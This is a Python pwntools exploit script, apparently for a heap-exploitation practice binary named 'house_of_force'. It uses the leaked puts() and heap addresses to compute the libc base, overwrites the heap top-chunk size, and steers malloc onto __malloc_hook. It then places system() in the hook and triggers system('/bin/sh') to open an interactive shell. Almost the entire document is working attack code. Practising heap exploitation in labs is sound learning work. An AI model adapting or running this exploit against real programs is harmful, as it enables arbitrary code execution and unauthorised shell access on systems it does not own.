#!/usr/bin/python3
from pwn import *

exe = "./house_of_force"
elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc

gs = '''
init-pwndbg
c
'''.format(**locals())

def start(argv=[], *a, **kw):
    if args.GDB:
        context.terminal = ["/mnt/c/wsl-terminal/open-wsl.exe", "-e"]
        return gdb.debug([exe] + argv, gdbscript=gs, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Select the "malloc" option, send size & data.
def malloc(size, data):
    io.send(b"1")
    io.sendafter(b"size: ", bytes(str(size), 'utf-8'))
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

io = start()
# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil(b"heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil(b"> ")
io.timeout = 0.1

# overwrite top-chunk
malloc(24, b"A"*24 + p64(0xffffffffffffffff))
distance = (libc.sym.__malloc_hook-0x20) - (heap+0x20)
malloc(distance, b'/bin/sh\0')

# all future calls to malloc will
# be redirected to system()
malloc(24, p64(libc.sym.system))

# addr of '/bin/sh'
cmd = heap + 0x30 # next(libc.search(b"/bin/sh"))

# it will call system('/bin/sh')
malloc(cmd, b"")
io.interactive()
